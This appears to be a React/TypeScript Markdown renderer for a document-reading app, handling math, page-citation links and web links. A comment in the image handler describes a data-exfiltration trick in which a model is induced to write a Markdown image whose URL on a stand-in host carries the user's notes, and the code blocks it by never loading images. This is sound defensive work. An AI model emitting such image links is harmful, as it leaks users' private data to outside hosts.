import "katex/dist/katex.min.css";
import { ExternalLink } from "lucide-react";
import { memo, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { usePageLabels } from "../hooks/usePageLabels";
import { relabelText } from "../lib/pageLabels";
import { SIZE_CLASSES, type TextSize } from "../lib/settings";

/** Plain text of a rendered link label. */
const textOf = (node: ReactNode): string =>
  typeof node === "string" || typeof node === "number"
    ? String(node)
    : Array.isArray(node)
      ? node.map(textOf).join("")
      : node && typeof node === "object" && "props" in node
        ? textOf((node.props as { children?: ReactNode }).children)
        : "";

/** Fenced code blocks (``` or ~~~, to their closing fence or the end) and inline code spans. */
const CODE = /^([ \t]*)(`{3,}|~{3,})[^\n]*\n[\s\S]*?(?:\n[ \t]*\2[ \t]*(?=\n|$)|$(?![\s\S]))|(`+)(?!`)(?:(?!\n[ \t]*\n)[\s\S])*?[^`]\3(?!`)/gm;

/**
 * LaTeX delimiters \( \) and \[ \] → $ / $$ so remark-math understands them, and a line that
 * is just "$$…$$" → a display formula (remark-math would show it inline, unlike LaTeX).
 * Code stays as it is: a regex like /\(\d+\)/ or LaTeX source shown as code is not math.
 */
export function normalizeMath(src: string) {
  const code: string[] = [];
  // Placeholders keep the lines intact, so "a line that is just $$…$$" still means the same.
  const masked = src.replace(CODE, (m) => `\u0000${code.push(m) - 1}\u0000`);
  return masked
    .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `$$${m}$$`)
    .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m}$`)
    .replace(/^([ \t]*)\$\$([^\n$][^\n]*?)\$\$[ \t]*$/gm, (_, indent: string, m: string) => `${indent}$$\n${indent}${m.trim()}\n${indent}$$`)
    .replace(/\u0000(\d+)\u0000/g, (_, i: string) => code[Number(i)]);
}

export const Markdown = memo(function Markdown({
  children,
  onJump,
  hasDoc,
  onNoteLine,
  size = "s",
}: {
  children: string;
  /** `doc`: the alias of another document ("[Script, p. 3](#doc=d2&page=3)"); `label`: the link text. */
  onJump: (page: number, doc?: string, label?: string) => void;
  /** Whether a document alias exists (links to unknown documents render as text). */
  hasDoc?: (alias: string) => boolean;
  /** "[L12](#note-line=12)" in a review of a note: show that line in the editor. */
  onNoteLine?: (line: number) => void;
  size?: TextSize;
}) {
  const labels = usePageLabels();
  const components: Components = {
    // Never load pictures: the address of one could carry text out of a note or an answer
    // (e.g. a model asked to write "![](https://site/?q=<your notes>)"). They stay a label.
    img({ src, alt }) {
      return (
        <span className="rounded bg-zinc-100 px-1 text-[0.85em] text-zinc-500 dark:bg-zinc-800" title={typeof src === "string" ? `Not loaded: ${src}` : undefined}>
          [picture{alt ? `: ${alt}` : ""}]
        </span>
      );
    },
    a({ href, children }) {
      const noteLine = href?.match(/^#note-line=(\d+)$/);
      if (noteLine) {
        if (!onNoteLine) return <span>{children}</span>;
        return (
          <button
            type="button"
            onClick={() => onNoteLine(Number(noteLine[1]))}
            className="mx-0.5 inline-flex items-center rounded-md bg-emerald-100 px-1.5 py-px align-baseline font-mono text-[0.8em] font-medium text-emerald-800 no-underline transition hover:bg-emerald-200 dark:bg-emerald-500/15 dark:text-emerald-300 dark:hover:bg-emerald-500/25"
            title="Show this line of your note"
          >
            {children}
          </button>
        );
      }
      const link = href?.match(/^#(?:doc=([\w-]+)&)?page=(\d+)$/);
      if (link && (!link[1] || hasDoc?.(link[1]))) {
        const [, doc, page] = link;
        const text = textOf(children);
        // Answers name the PDF's page; show the number printed on it.
        const plain = typeof children === "string" || (Array.isArray(children) && children.every((x) => typeof x === "string"));
        const shown = plain ? relabelText(text, Number(page), labels.cite(doc, text)) : children;
        return (
          <button
            type="button"
            onClick={() => onJump(Number(page), doc, text)}
            className="mx-0.5 inline-flex items-center rounded-md bg-violet-100 px-1.5 py-px align-baseline text-[0.85em] font-medium text-violet-700 no-underline transition hover:bg-violet-200 dark:bg-violet-500/15 dark:text-violet-300 dark:hover:bg-violet-500/25"
          >
            {shown}
          </button>
        );
      }
      // Local file links (and anything the URL sanitizer stripped) render as plain text.
      if (!href || !/^https?:\/\//.test(href)) return <span>{children}</span>;
      // Web links (sources of a web search): a new tab, marked unlike page citations.
      let host = "";
      try {
        host = new URL(href).hostname.replace(/^www\./, "");
      } catch {
        /* keep empty */
      }
      return (
        <a href={href} target="_blank" rel="noreferrer noopener" title={host ? `Opens ${host} in a new tab` : undefined} className="text-sky-700 decoration-sky-300 dark:text-sky-300">
          {children}
          <ExternalLink className="ml-0.5 inline size-[0.8em] align-baseline opacity-60" aria-hidden />
        </a>
      );
    },
  };

  return (
    <div className={`prose ${SIZE_CLASSES[size].prose} prose-zinc dark:prose-invert max-w-none prose-p:leading-relaxed prose-pre:bg-zinc-900 prose-pre:text-zinc-100 prose-code:before:content-none prose-code:after:content-none prose-headings:font-semibold`}>
      <ReactMarkdown remarkPlugins={[remarkGfm, remarkMath]} rehypePlugins={[rehypeKatex]} components={components}>
        {normalizeMath(children)}
      </ReactMarkdown>
    </div>
  );
});
